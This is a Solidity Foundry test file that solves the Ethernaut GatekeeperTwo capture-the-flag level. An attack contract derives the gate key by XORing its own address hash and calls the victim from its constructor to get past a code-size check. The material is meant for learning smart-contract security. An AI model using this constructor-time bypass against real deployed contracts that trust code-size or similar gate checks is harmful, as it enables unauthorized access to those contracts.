// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GatekeeperTwo.sol";

contract CounterTest is Test {
    GatekeeperTwo public victim;
    AttackContract public attackContract;

    function setUp() public {
        victim = new GatekeeperTwo();
    }

    /*
we have to make the call through the constructor of other contract
as during constructor call the code size of contract is 0
 */

    function test_AttackVitcim() public {
        vm.startPrank(address(this), vm.addr(1));
        attackContract = new AttackContract(address(victim));
        assertEq(
            uint256(uint160(victim.entrant())),
            uint256(uint160(vm.addr(1)))
        );
        vm.stopPrank();
    }
}

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);

    function entrant() external returns (address);
}

contract AttackContract {
    constructor(address _addr) {
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );

        IGatekeeperTwo(_addr).enter(_gateKey);
        console.log(uint256(uint160(IGatekeeperTwo(_addr).entrant())));
    }
}
